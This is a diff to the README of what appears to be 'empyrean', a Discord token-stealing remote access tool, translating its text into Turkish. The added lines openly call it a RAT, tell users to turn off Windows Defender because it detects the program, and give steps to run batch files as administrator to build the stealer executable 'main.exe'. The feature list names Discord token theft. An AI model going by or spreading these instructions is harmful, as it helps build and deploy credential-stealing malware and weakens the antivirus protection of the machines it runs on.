@@ -10,11 +10,11 @@
     <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
     <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
     <br>
-    Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/addi00000">Telegram</a>
+    WİNDOWS DEFENDERİ KAPATMASSANIZ ÇALIŞMAZ HATA VERECEKTİR SONUÇTA RAT PROGRAMI NORMAL ALGILAMASI BU SEBEP LE LÜTFEN WİNDOWS DEFENDERİNİZİ KAPATINIZ İYİ KULLANIMLAR <a href="https://discord.gg/CpfDnc9HGm">Discord</a>
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
-## Features
+## Özellikler
 
 -   Discord token info
     -   Nitro
@@ -59,11 +59,11 @@
 
 ### Setup
 
-1. zip install
-2. Extract zip
-3. Run `install_python.bat` if you don't have python installed
-4. Run the builder by double clicking the `build.bat` file
-5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
+1. zip'i indir
+2. masaütüne çıkar
+3. Yönetici olarak çalıştırın `install_python.bat` programını pythonu kuracaktır 
+4. Yönetici olarak  `build.bat` dosyasını çalıştırın (ratı oluşturacak yazılımdır)
+5. rat exe sini `dist` dosyasına oluşturacaktır adı `main.exe` olacaktır değiştirebilirsiniz iyi günler he bide star ve fork atarsanız sevinirim :)
 
 <div align="center">
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
